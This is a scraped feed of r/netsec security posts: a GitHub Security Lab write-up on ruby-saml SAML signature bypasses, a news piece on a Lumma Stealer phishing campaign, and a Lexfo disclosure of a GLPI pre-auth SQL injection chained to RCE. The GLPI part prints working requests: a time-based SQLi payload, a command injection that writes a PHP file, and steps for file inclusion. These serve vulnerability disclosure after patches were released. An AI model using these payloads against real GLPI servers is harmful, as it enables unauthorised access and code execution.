validated\"></a></h2><p>Security assertion markup language (<a href=\"https://en.wikipedia.org/wiki/Security_Assertion_Markup_Language\">SAML</a>) responses are used to transport information about a signed-in user from the identity provider (IdP) to the service provider (SP) in XML format. Often the only important information transported is a username or an email address. When the HTTP POST binding is used, the SAML response travels from the IdP to the SP via the browser of the end user. This makes it obvious why there has to be some sort of signature verification in play to prevent the user from tampering with the message.</p><p>Let’s have a quick look at what a simplified SAML response looks like:<img data-recalc-dims=\"1\" decoding=\"async\" loading=\"lazy\" src=\"https://github.blog/wp-content/uploads/2025/03/goodassertion7_2.png?resize=1024%2C355\" alt=\"A diagram depicting a simplified SAML response on the left and the verification of the digest and the signature on the right.\" width=\"1024\" height=\"355\" srcset=\"https://github.blog/wp-content/uploads/2025/03/goodassertion7_2.png?w=2632 2632w, https://github.blog/wp-content/uploads/2025/03/goodassertion7_2.png?w=300 300w, https://github.blog/wp-content/uploads/2025/03/goodassertion7_2.png?w=768 768w, https://github.blog/wp-content/uploads/2025/03/goodassertion7_2.png?w=1024 1024w, https://github.blog/wp-content/uploads/2025/03/goodassertion7_2.png?w=1536 1536w, https://github.blog/wp-content/uploads/2025/03/goodassertion7_2.png?w=2048 2048w\" sizes=\"auto, (max-width: 1000px) 100vw, 1000px\"></p><p><em>Note: in the response above the XML namespaces were removed for better readability.</em></p><p>As you might have noticed: the main part of a simple SAML response is its assertion element (A), whereas the main information contained in the assertion is the information contained in the  element (B) (here the NameID containing the username: admin). A real assertion typically contains more information (e.g.  and  dates as part of a  element.)</p><p>Normally, the  (A) (without the whole  part) is <a href=\"https://en.wikipedia.org/wiki/Canonical_XML\">canonicalized</a> and then compared against the  (C) and the  (D) is canonicalized and verified against the  (E). In this sample, the assertion of the SAML response is signed, and in other cases the whole SAML response is signed.</p><h2>Searching for parser differentials<a href=\"https://github.blog/security/sign-in-as-anyone-bypassing-saml-sso-authentication-with-parser-differentials/#searching-for-parser-differentials\" aria-label=\"Searching for parser differentials\"></a></h2><p>We learned that ruby-saml used two different XML parsers (REXML and Nokogiri) for validating the SAML response. Now let’s have a look at the verification of the signature and the digest comparison.\nThe focus of the following explanation lies on the <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L268\"></a> method inside of .</p><p>Inside that method, there’s a broad XPath <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L278C1-L282C8\">query</a> with REXML for the first signature element inside the SAML document:</p><pre><code>sig_element = REXML::XPath.first(\n  @working_copy,\n  \"//ds:Signature\",\n  {\"ds\"=&gt;DSIG}\n)\n</code></pre><p><em>Hint: When reading the code snippets, you can tell the difference between queries for REXML and Nokogiri by looking at how they are called. REXML methods are prefixed with , whereas Nokogiri methods are called on .</em></p><p>Later, the actual  is <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L293C1-L298C92\">read</a> from this element:</p><pre><code>base64_signature = REXML::XPath.first(\n  sig_element,\n  \"./ds:SignatureValue\",\n  {\"ds\" =&gt; DSIG}\n)\nsignature = Base64.decode64(OneLogin::RubySaml::Utils.element_text(base64_signature))\n</code></pre><p>Note: the name of the  element might be a bit confusing. While it contains the actual signature in the  node it also contains the part that is actually signed in the  node. Most importantly the  element contains the digest (hash) of the assertion and information about the used key.</p><p>So, an actual  element could look like this (removed namespace information for better readability):</p><pre><code>&lt;Signature&gt;\n    &lt;SignedInfo&gt;\n        &lt;CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\" /&gt;\n        &lt;SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\" /&gt;\n        &lt;Reference URI=\"#_SAMEID\"&gt;\n            &lt;Transforms&gt;&lt;Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\" /&gt;&lt;/Transforms&gt;\n            &lt;DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\" /&gt;\n            &lt;DigestValue&gt;Su4v[..]&lt;/DigestValue&gt;\n        &lt;/Reference&gt;\n    &lt;/SignedInfo&gt;\n    &lt;SignatureValue&gt;L8/i[..]&lt;/SignatureValue&gt;\n    &lt;KeyInfo&gt;\n        &lt;X509Data&gt;\n            &lt;X509Certificate&gt;MIID[..]&lt;/X509Certificate&gt;\n        &lt;/X509Data&gt;\n    &lt;/KeyInfo&gt;\n&lt;/Signature&gt;\n</code></pre><p>Later in the same method () there’s again a <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L307\">query for the Signature</a>(s)—but this time with Nokogiri.</p><pre><code>noko_sig_element = document.at_xpath('//ds:Signature', 'ds' =&gt; DSIG)\n</code></pre><p>Then the  element is taken from that signature and <a href=\"https://en.wikipedia.org/wiki/Canonical_XML\">canonicalized</a>:</p><pre><code>noko_signed_info_element = noko_sig_element.at_xpath('./ds:SignedInfo', 'ds' =&gt; DSIG)\n\ncanon_string = noko_signed_info_element.canonicalize(canon_algorithm)\n</code></pre><p>Let’s remember this  contains the canonicalized  element.</p><p>The  element is then also <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L314C6-L318C8\">extracted</a> with REXML:</p><pre><code> signed_info_element = REXML::XPath.first(\n        sig_element,\n        \"./ds:SignedInfo\",\n        { \"ds\" =&gt; DSIG }\n )\n</code></pre><p>From this  element the  node is <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L324\">read</a>:</p><pre><code>ref = REXML::XPath.first(signed_info_element, \"./ds:Reference\", {\"ds\"=&gt;DSIG})\n</code></pre><pre><code>reference_nodes = document.xpath(\"//*[@ID=$id]\", nil, { 'id' =&gt; extract_signed_element_id })\n</code></pre><p>The method <code>extract_signed_element_id</code><a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L406C9-L406C34\">extracts</a> the signed element id with help of REXML. From the previous authentication bypass (CVE-2024-45409), there’s now a <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L328\">check</a> that only one element with the same ID can exist.</p><p>The first of the  is taken and canonicalized:</p><pre><code>hashed_element = reference_nodes[0][..]canon_hashed_element = hashed_element.canonicalize(canon_algorithm, inclusive_namespaces)\n</code></pre><p>The  is then <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L349C7-L349C59\">hashed</a>:</p><pre><code>hash = digest_algorithm.digest(canon_hashed_element)\n</code></pre><p>The  to compare it against is then <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L350C7-L355C99\">extracted</a> with REXML:</p><pre><code>encoded_digest_value = REXML::XPath.first(\n        ref,\n        \"./ds:DigestValue\",\n        { \"ds\" =&gt; DSIG }\n      )\ndigest_value = Base64.decode64(OneLogin::RubySaml::Utils.element_text(encoded_digest_value))\n</code></pre><p>Finally, the  (built from the element extracted by Nokogiri) is <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L357\">compared</a> against the  (extracted with REXML):</p><pre><code>unless digests_match?(hash, digest_value)\n</code></pre><p>The  extracted some lines ago (a result of an extraction with Nokogiri) is later <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L366C7-L366C86\">verified against</a> (extracted with REXML).</p><pre><code>unless cert.public_key.verify(signature_algorithm.new, signature, canon_string)\n</code></pre><p>In the end, we have the following constellation:</p><ol><li>The assertion is extracted and canonicalized with Nokogiri, and then hashed. In contrast, the hash against which it will be compared is extracted with REXML.  </li><li>The SignedInfo element is extracted and canonicalized with Nokogiri - it is then verified against the SignatureValue, which was extracted with REXML.</li></ol><h2>Exploiting the parser differential<a href=\"https://github.blog/security/sign-in-as-anyone-bypassing-saml-sso-authentication-with-parser-differentials/#exploiting-the-parser-differential\" aria-label=\"Exploiting the parser differential\"></a></h2><p>The question is: is it possible to create an XML document where REXML sees one signature and Nokogiri sees another?</p><p>Ahacker1, participating in the bug bounty, was faster to produce a working exploit using a parser differential. Among other things, ahacker1 was inspired by the <a href=\"https://mattermost.com/blog/securing-xml-implementations-across-the-web/\">XML roundtrips vulnerabilities</a> published by Mattermost’s Juho Forsén in 2021.</p><p>Not much later, I produced an exploit using a different parser differential with the help of <a href=\"https://blog.trailofbits.com/2024/03/29/introducing-ruzzy-a-coverage-guided-ruby-fuzzer/\">Trail of Bits’ Ruby fuzzer</a> called ruzzy.</p><p>Both exploits result in an authentication bypass. Meaning that an attacker, who is in possession of a single valid signature that was created with the key used to validate SAML responses or assertions of the targeted organization, can use it to construct assertions for any users which will be accepted by ruby-saml. Such a signature can either come from a signed assertion or response from another (unprivileged) user or in certain cases, it can even come from signed metadata of a SAML identity provider (which can be publicly accessible).</p><p>An exploit could look like this. Here, an additional Signature was added as part of the  element that is only visible to Nokogiri:</p><p>The  element (A) from the signature that is visible to Nokogiri is canonicalized and verified against the  (B) that was extracted from the signature seen by REXML.</p><p>The assertion is retrieved via Nokogiri by looking for its ID. This assertion is then canonicalized and hashed (C). The hash is then compared to the hash contained in the  (D). This DigestValue was retrieved via REXML. This DigestValue has no corresponding signature.</p><p>So, two things take place:</p><ul><li>A valid SignedInfo with DigestValue is verified against a valid signature. (which checks out)  </li><li>A fabricated canonicalized assertion is compared against its calculated digest. (which checks out as well)</li></ul><p>This allows an attacker, who is in possession of a valid signed assertion for any (unprivileged) user, to fabricate assertions and as such impersonate any other user.</p><h3>Check for errors when using Nokogiri<a href=\"https://github.blog/security/sign-in-as-anyone-bypassing-saml-sso-authentication-with-parser-differentials/#check-for-errors-when-using-nokogiri\" aria-label=\"Check for errors when using Nokogiri\"></a></h3><p>Parts of the currently known, undisclosed exploits can be stopped by checking for Nokogiri parsing errors on SAML responses. Sadly, those errors do not result in exceptions, but need to be checked on the <a href=\"https://www.rubydoc.info/github/sparklemotion/nokogiri/Nokogiri%2FXML%2FDocument:errors\"></a> member of the parsed document:</p><pre><code>doc = Nokogiri::XML(xml) do |config|\n  config.options = Nokogiri::XML::ParseOptions::STRICT | Nokogiri::XML::ParseOptions::NONET\nend\n\nraise \"XML errors when parsing: \" + doc.errors.to_s if doc.errors.any?\n</code></pre><p>While this is far from a perfect fix for the issues at hand, it renders at least one exploit infeasible.</p><p>We are not aware of any reliable indicators of compromise. While we’ve found a potential indicator of compromise, it only works in debug-like environments and to publish it, we would have to reveal too many details about how to implement a working exploit so we’ve decided that it’s better not to publish it. Instead, our best recommendation is to look for suspicious logins via SAML on the service provider side from IP addresses that do not align with the user’s expected location.</p><h2>SAML and XML signatures:as confusing as it gets<a href=\"https://github.blog/security/sign-in-as-anyone-bypassing-saml-sso-authentication-with-parser-differentials/#saml-and-xml-signaturesas-confusing-as-it-gets\" aria-label=\"SAML and XML signatures:as confusing as it gets\"></a></h2><p>Some might say it’s hard to integrate systems with SAML. That might be true. However, it’s even harder to write implementations of SAML using XML signatures in a secure way. As others have stated before: it’s probably best to <a href=\"https://ssoready.com/blog/engineering/ruby-saml-pwned-by-xml-signature-wrapping-attacks/#how-to-fix-this-disregard-the-spec\">disregard the specifications</a>, as following them doesn’t help build secure implementations.\nTo rehash how the validation works if the SAML assertion is signed, let’s have a look at the graphic below,  depicting a simplified SAML response. The assertion, which transports the protected information, contains a signature. Confusing, right?</p><p>To complicate it even more: What is even signed here? The whole assertion? No!</p><p>What’s signed is the  element and the  element contains a . This  is the hash of the canonicalized assertion with the signature element removed before the canonicalization. This two-stage verification process can lead to implementations that have a disconnect between the verification of the hash and the verification of the signature. This is the case for these Ruby-SAML parser differentials: while the hash and the signature check out on their own, they have no connection. The hash is actually a hash of the assertion, but the signature is a signature of a different  element containing another hash. What you actually want is a direct connection between the hashed content, the hash, and the signature. (And once the verification is done you only want to retrieve information from the exact part that was actually verified.) Or, alternatively, use a less complicated standard to transport a cryptographically signed username between two systems - but here we are.</p><p>In this case, the library already extracted the  and used it to verify the signature of its canonicalized string,. However, it did not use it to obtain the digest value. If the library had used the content of the already extracted  to obtain the digest value, it would have been secure in this case even with two XML parsers in use.</p><p>As shown once again: relying on two different parsers in a security context can be tricky and error-prone. That being said: exploitability is not automatically guaranteed in such cases. As we have seen in this case, checking for Nokogiri errors could not have prevented the parser differential, but could have stopped at least one practical exploitation of it.</p><p>The initial fix for the authentication bypasses does not remove one of the XML parsers to prevent API compatibility problems. As noted, the more fundamental issue was the disconnect between verification of the hash and verification of the signature, which was exploitable via parser differentials. The <a href=\"https://github.com/SAML-Toolkits/ruby-saml/pull/736\">removal of one of the XML</a> parsers was already planned for other reasons, and will likely come as part of a major release in combination with additional improvements to strengthen the library. If your company relies on open source software for business-critical functionality, consider <a href=\"https://github.com/sponsors\">sponsoring</a> them to help fund their future development and bug fix releases.</p><p>If you’re a user of ruby-saml library, make sure to update to the latest version, 1.18.0, containing fixes for <a href=\"https://github.com/SAML-Toolkits/ruby-saml/security/advisories/GHSA-4vc4-m8qh-g8jm\">CVE-2025-25291</a> and <a href=\"https://github.com/SAML-Toolkits/ruby-saml/security/advisories/GHSA-754f-8gm6-c4r2\">CVE-2025-25292</a>. References to libraries making use of ruby-saml (such as <a href=\"https://github.com/omniauth/omniauth-saml\">omniauth-saml</a>) need also be updated to a version that reference a fixed version of ruby-saml. We will publish a proof of concept exploit at a later date in the <a href=\"https://github.com/github/securitylab\">GitHub Security Lab repository</a>.</p><p>Special thanks to Sixto Martín, maintainer of ruby-saml, and Jeff Guerra from the GitHub Bug Bounty program.\nSpecial thanks also to ahacker1 for giving inputs to this blog post.</p><ul><li>2024-11-04: Bug bounty report demonstrating an authentication bypass was reported against a GitHub test environment evaluating ruby-saml for SAML authentication.  </li><li>2024-11-04: Work started to identify and test potential mitigations.  </li><li>2024-11-12: A second authentication bypass was found by Peter that renders the planned mitigations for the first useless.  </li><li>2024-11-13: Initial contact with Sixto Martín, maintainer of ruby-saml.  </li><li>2024-11-14: Both parser differentials are reported to ruby-saml, the maintainer responds immediately.  </li><li>2024-11-14: The work on potential patches by the maintainer and ahacker1 begins. (One of the initial ideas was to remove one of the XML parsers, but this was not feasible without breaking backwards compatibility).  </li><li>2025-02-04: ahacker1 proposes a non-backwards compatible fix.  </li><li>2025-02-06: ahacker1 also proposes a backwards compatible fix.  </li><li>2025-02-12: The 90 days deadline of GitHub Security Lab advisories ends.  </li><li>2025-02-16: The maintainer starts working on a fix with the idea to be backwards-compatible and easier to understand.  </li><li>2025-02-17: Initial contact with GitLab to coordinate a release of their on-prem product with the release of the ruby-saml library.  </li><li>2025-03-12: A fixed version of ruby-saml was released.</li></ul><div><article><div><div><p>Security Researcher at GitHub Security Lab</p></div></div></article></div>","contentLength":17509,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1ja6lxm/sign_in_as_anyone_bypassing_saml_sso/"},{"title":"New all-in-one monitoring project with leaks, cve db, ransomware info, ddos target, and news","url":"https://cybermonit.com/leaks","date":1741850577,"author":"/u/Electrical-Wish-4221","guid":798,"unread":true,"content":"<!DOCTYPE html>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1ja6gyj/new_allinone_monitoring_project_with_leaks_cve_db/"},{"title":"New Lumma Stealer campaign abuses Reddit threads to drop malware via fake WeTransfer links","url":"https://moonlock.com/fake-reddit-wetransfer-lumma-stealer","date":1741821147,"author":"/u/Individual-Gas5276","guid":810,"unread":true,"content":"<p>A new large-scale cybercriminal operation has been identified operating in the wild.&nbsp;</p><p>This new threat campaign ran over 1,000 fake sites, impersonating WeTransfer and Reddit. The goal of the campaign is to trick users into downloading the Lumma stealer. But it is also part of a growing trend that is becoming the norm. Let’s dive into it.&nbsp;</p><h2>1,000 fake Reddit and WeTransfer sites coded to load Lumma&nbsp;</h2><p>Recently, the X (formerly Twitter) user @crep1x, a Cybercrime Analyst from <a href=\"https://www.sekoia.io/en/homepage/\" target=\"_blank\" rel=\"noreferrer noopener\">Sequoia</a> tracking adversaries’ activities and infrastructure, pulled back the curtain on a massive new cybercriminal operation.&nbsp;&nbsp;&nbsp;</p><p>@crep1x shared a list of Indicators of Compromise (IoC) with about <a href=\"https://gist.githubusercontent.com/qbourgue/071c333ff5182f031da3ba55cc7da1ec/raw/ec4ba396c0d1052cc8b0a69c1bad1e0e5aef2ab6/malicious_domains_impersonating_reddit_wetransfer_selfau3_dropper_lumma_stealer_20012025.txt\">1,000 malicious domains hosting webpages</a>, a shocking amount of domains. Threat actors used these pages to trick users into downloading password-protected files that concealed malware, specifically <a href=\"https://moonlock.com/lumma-stealer\">Lumma Stealer</a>. &nbsp;</p><p>“These archives contain an AutoIT dropper, we internally named #SelfAU3 Dropper at&nbsp;@sekoia_io,” @crep1x said.&nbsp;</p><p>Lumma Stealer is offered on the dark web under the malware-as-a-service (MaaS) business model. This means that those developing the stealer are continually enhancing the malware with updates and new features while making it available to any operator (criminals or black hatters who rent out or buy the source code of the malware).&nbsp;</p><p>Since August 2022, when it was first spotted, Lumma has been linked to Russian-speaking hacker forums. Although Lumma can extract sensitive data from web browsers and files, it is not heavily used as nation-state spyware.&nbsp;The malware is designed for criminals seeking to earn illegal financial gains.</p><p>Lumma goes after web browser data. It targets cryptocurrency wallets and two-factor authentication (2FA) browser extensions.</p><p>The stealer is promoted on Telegram, with several Telegram bots selling their services, reporting bugs, or offering support and other resources.&nbsp;</p><p>Additionally, threat actors are often combining Lumma Stealer campaigns with the <a href=\"https://moonlock.com/atomic-macos-stealer\">AMOS stealer</a>. This double stealer approach can breach victims’ machines no matter what operating system they are running, Windows or Mac.&nbsp;&nbsp;</p><p>Efstratios Lontzetidis, a Cyber Threat Intelligence Researcher based in Athens, Greece, explained that the <a href=\"https://medium.com/@s.lontzetidis/lumma-2024-dominating-the-info-stealer-market-070e7d8fa3d6\">Lumma malware is offered under three plans</a>: Experienced ($250/month), Professional ($500/month), and Corporate ($1,000/month).</p><p>The particular threat campaign that impersonates WeTransfer and Reddit seems to have been done under a Corporate Lumma plan. This can be inferred due to the vast infrastructure discovered — 1,000 websites.&nbsp;</p><p>While Lumma’s development and distribution are linked to Russian black hatters, operators can be based anywhere in the world. So, the presence of Lumma does not imply attribution. </p><p>It is worth noting that Lumma developers ban operators from targeting Russian-speaking organizations and companies.&nbsp;</p><h3>Can Lumma breach macOS or Safari?</h3><p>At the present time, Lumma Stealer malware primarily targets Windows systems through deceptive tactics.&nbsp;The stealer leverages commands that often involve the Windows Run dialog and PowerShell scripts. These are specific to the Windows operating system.&nbsp;</p><p>Lumma can also breach browsers like Chrome, Firefox, and others. However, given that Safari is predominantly used on macOS and iOS platforms, which do not support these Windows-specific features, it is unlikely that Lumma can compromise the Safari web browser. At least, that’s the case for now. This can change very rapidly. &nbsp;&nbsp;</p><p>As mentioned, large-scale financially driven phishing criminal operations like these have begun to distribute Windows stealers and macOS stealers alike. Their fake webpages can gather operating system information and redirect users to the malware that fits their OS.</p><p>More importantly, malware developers are also constantly improving their malware, and stealers that can breach Windows and Macs are the holy grail.</p><h3>Future outlook for large-scale cybercriminal campaigns</h3><p>Based on our observations and investigations from last year and this year, we expect more large-scale cyber criminal operations like these to emerge. Malware automation, MaaS services offered on the dark web, GenAI, ready-to-use phishing kits, and fake webpage generators are widely available for anyone online.&nbsp;</p><p>We have reported on threat campaigns in which cybercriminals continually increase their digital attack surface to cast a wider net. This often means generating a significant number of domains for each campaign and taking to different media for automated distribution and promotion. From Google Ads abuse to social media and platforms like Reddit, GitHub, and others, everything follows this trend.</p><p>This cyberattack is by no means unique but part of a wider trend where vast, malicious infrastructures and C2 servers are rapidly set up.</p><p>Cybercriminals running these campaigns have also become very good at hiding their tracks. Once a report exposes their scams and illegal operations, the entire infrastructure disappears, often leaving cybersecurity researchers empty-handed, with little information about the operation and even less information for attribution.</p><p>Creating vast infrastructures also makes the work of security researchers very hard. Tracking and tracing a couple of domains can be done, but analyzing 1,000 is a nightmare.</p><p>To stay safe from these threats, use strong passwords, enable MFA, and only engage with websites that are verified and official. Never download files, and understand that more threat campaigns like these, and maybe even bigger ones, are expected.&nbsp;</p><p>The reason why these large-scale phishing campaigns prevail is simple. For criminals, it is a low-risk, high-reward opportunity. All they have to do is lease out a stealer and hire the services that come with it. Until this business model is disrupted, it will only continue to grow.</p>","contentLength":5842,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1j9xq07/new_lumma_stealer_campaign_abuses_reddit_threads/"},{"title":"Ruthless Mantis - Modus Operandi","url":"https://catalyst.prodaft.com/public/report/modus-operandi-of-ruthless-mantis/overview","date":1741814119,"author":"/u/small_talk101","guid":803,"unread":true,"content":"<!DOCTYPE html>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1j9v0dh/ruthless_mantis_modus_operandi/"},{"title":"Pre-authentication SQL injection to RCE in GLPI (CVE-2025-24799/CVE-2025-24801)","url":"https://blog.lexfo.fr/glpi-sql-to-rce.html","date":1741776837,"author":"/u/uBaze","guid":806,"unread":true,"content":"<p>Several  instances have been identified during Red Team engagements. The software is popular with French-speaking companies, some of those even expose their instances directly on the Internet. GLPI has been historically known to harbor multiple easy-to-find vulnerabilities, and because it is often connected to an Active Directory, finding a vulnerability on this application for Red Team engagements or internal infrastructure audits could lead to initial access to the internal network and the recovery of an active directory account.</p><p>Multiple SQL injections on GLPI have been reported in the past. Most of them are considered to be post-authenticated and require an account to trigger the vulnerability (1) (3) (4). The ones accessible pre-authentication are quite rare (2) (5) and have been patched on the instances found during our external reconnaissance phase.</p><p>A new SQL injection has been found on the Inventory native feature of GLPI (which is commonly enabled). This feature is accessible without any required authentication mechanism.</p><p>At the time of this article's writing,  was the latest stable version, and it will be used as an example, but the vulnerability may affect previous versions.</p><p>The  function found in  is an accessible pre-authentication function used by the GLPI agent for inventory purposes.</p><div><pre><code></code></pre></div><p>This function takes user inputs and stores them into variables such as , then passed to the  function after going through a sanitizing function  since <a href=\"https://github.com/glpi-project/glpi/commit/5b03740aaf57974207e2555ff710add35d7a82e9\">10.0.7</a>.</p><h2>dbEscapeRecursive() - 10.0.17</h2><div><pre><code></code></pre></div><p>This function takes an array as input and recursively calls  to escape its input, the vulnerability is easily catchable here. What if we could send a value that is neither an  nor a ?</p><h2>handleRequest() - 10.0.17</h2><p>In the  function used to parse agent requests, it is possible to perform an agent request using two methods, XML and JSON.</p><div><pre><code></code></pre></div><p>While the  only performs a quick , it can only create , , , and  objects (which does not properly have a  function). The  however creates a  object from the user input.</p><div><pre><code></code></pre></div><p>This is the perfect candidate to bypass the  function, as it is an object that can be converted to a string easily.</p><div><pre><code>php &gt; $xml = simplexml_load_string('&lt;test&gt;a&lt;/test&gt;');\nphp &gt; var_dump($xml);\nobject(SimpleXMLElement)#2 (1) {\n  [0]=&gt;\n  string(1) \"a\"\n}\nphp &gt; var_dump($xml.\"toString\");\nstring(9) \"atoString\"\n</code></pre></div><p>To exploit this vulnerability, an XML request to the agent request endpoint is crafted and leads to an SQL injection exploitable using a simple time-based attack.</p><div><pre><code>POST /index.php/ajax/ HTTP/1.1\nHost: glpi\nUser-Agent: python-requests/2.32.3\nContent-Type: application/xml\nContent-Length: 232\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n    &lt;xml&gt;\n    &lt;QUERY&gt;get_params&lt;/QUERY&gt;\n    &lt;deviceid&gt;', IF((1=1),(select sleep(5)),1), 0, 0, 0, 0, 0, 0);#&lt;/deviceid&gt;\n    &lt;content&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&lt;/content&gt;\n&lt;/xml&gt;\n</code></pre></div><p>Using this simple request, the server sleeps for 5 seconds due to the  condition being true. It is now possible to extract any data from the database using the privileges of the current GLPI database user.</p><p>It is important to note that the structure of the database changes from one version to another. The number of columns in the query above may therefore be different.</p><p>Now that  privileges to the database have been acquired, multiple ways exist to gain a valid session. The obvious one is recovering accounts from the database and attempting a password crack. However, with the passwords being stored using , it could be a challenge to recover the clear text of a technician or super-administrator account.</p><p>If the  of an account is set in the database, this can be used to easily obtain a valid session and gain access to the GUI of GLPI through the API authentication method.</p><div><pre><code>&lt;?php\nPOST /glpi/front/login.php HTTP/1.1\nHost: &lt;redacted&gt;\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 212\nOrigin: http://&lt;redacted&gt;\nConnection: keep-alive\nReferer: http://&lt;redacted&gt;/glpi/index.php\n\nredirect=&amp;_glpi_csrf_token=&lt;redacted&gt;&amp;field&lt;redacted&gt;=test&amp;field&lt;redacted&gt;=test&amp;auth=local&amp;submit=&amp;user_token=&lt;api_token&gt;\n</code></pre></div><p>The server then answers with a valid cookie that can be used to access the GUI.</p><div><pre><code>Set-Cookie: glpi_&lt;redacted&gt;=&lt;redacted&gt;; path=/\n</code></pre></div><p>This token is used in the calendar feature and allows you to share a personal calendar using a unique token. This token uses the  method to authenticate a session, then destroy the session after printing the user's calendar.</p><p>Previously, it was possible to recover the impersonated session using a  by forcing a fatal error before the script ends its execution. This has been mitigated since 10.0.9 by setting the option  to .</p><p>The easiest method to obtain remote code execution once an administrator account has been compromised is to go to the plugins Marketplace. It used to even host a \"Shell commands\" plugin that has since been disabled for remote installations, however, there are still plenty of vulnerable plugins.</p><p>Sometimes, the GLPI server does not have direct internet access, however, a proxy server can be configured from the administration interface, this can be leveraged by an attacker for example by setting up their own proxy server or by configuring the internal corporate proxy.</p><p>For example, the public plugin  is still vulnerable to a system command injection.</p><div><pre><code>POST /glpi/marketplace/printercounters/ajax/process.php HTTP/1.1\nHost: &lt;redacted&gt;\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Glpi-Csrf-Token: &lt;redacted&gt;\nX-Requested-With: XMLHttpRequest\nContent-Length: 266\nConnection: keep-alive\nReferer: http://&lt;redacted&gt;/glpi/marketplace/printercounters/front/config.form.php\nCookie: glpi_&lt;redacted&gt;=&lt;redacted&gt;; stay_login=0\n\naction=killProcess&amp;items_id=1231231';echo `{echo,PD9waHAgcGhwaW5mbygpOyA/Pg%3d%3d}|{base64,-d}|{tee,rz.php}`;%23\n</code></pre></div><h2>Method 2: Local File Inclusion - 10.0.17</h2><p>A local file inclusion has also been identified in the PDF export functionality. This functionality allows an administrator to export various tables to PDF format using the library . It is possible to set up a custom PDF font in the configuration entry  (changed globally through a super-admin account, or by any account through their personnalization options inside their user profile), which is not properly checked for directory traversal, either from the  or  side.</p><p>PDF fonts are simply php files stored inside the TCPDF  folder, due to this issue it is possible to include any PHP files from the system if the font name is controlled.</p><div><pre><code></code></pre></div><p>To exploit this vulnerability, a few preliminary steps are necessary. By default, php files are not allowed to be uploaded in GLPI, but this list can be altered by going to the Dropdown option \"Document types\" accessible at . Then, the path to the  folder needs to be obtained, this information is available in , once it has been obtained, a simple file upload can be performed through  (available on most forms of GLPI).</p><ul><li>Update the Document Type dropdown list to allow  extensions</li><li>Recover the  location from </li><li>Upload a PHP file using </li><li>Set the  configuration to <code>../../../../../../../../{GLPI_TMP_DIR}/uploadedfile</code></li><li>Trigger the local file inclusion by exporting a table to PDF, for example <code>/front/report.dynamic.php?item_type=Computer&amp;sort%5B0%5D=1&amp;order%5B0%5D=ASC&amp;start=0&amp;criteria%5B0%5D%5Bfield%5D=view&amp;criteria%5B0%5D%5Blink%5D=contains&amp;criteria%5B0%5D%5Bvalue%5D=&amp;display_type=2</code></li></ul><p>The inventory feature in  is vulnerable to an unauthenticated SQL injection. While this feature is not enabled by default, it was enabled in most, if not all, installations we encountered during our Red Team assessments.</p><p>By exploiting this vulnerability, it is possible to obtain a valid GUI session through the  or  columns in database which are stored in clear text if these have been previously set up.</p><p>Once authenticated, it is possible to exploit a local file inclusion vulnerability using the PDF export feature and achieve remote code execution on vulnerable instances.</p><ul><li>2024-12-25 - Discovery of the vulnerability</li><li>2025-01-28 - Report of the vulnerability through </li><li>2025-01-28 -  validates the report and assigns  (exécution de code à distance)</li><li>2025-01-28 -  validates the report and assigns  (injection SQL)</li><li>2025-02-12 - Release patched version </li><li>2025-03-12 - Article released</li></ul>","contentLength":8362,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1j9hcdw/preauthentication_sql_injection_to_rce_in_glpi/"},{"title":"Analysis of CVE-2025-24813 Apache Tomcat Path Equivalence RCE","url":"https://scrapco.de/blog/analysis-of-cve-2025-24813-apache-tomcat-path-equivalence-rce.html","date":1741766426,"author":"/u/buherator","guid":802,"unread":true,"content":"<p>On 10. March 2025. ASF <a href=\"https://lists.apache.org/thread/j5fkjv2k477os90nczf2v9l61fb0kkgq\">announced</a> CVE-2025-24813, an Apache Tomcat vulnerability that may result in information disclosure or corruption, and even remote code execution. This is a quick and dirty analysis explaining the parts of the picture that are not in the 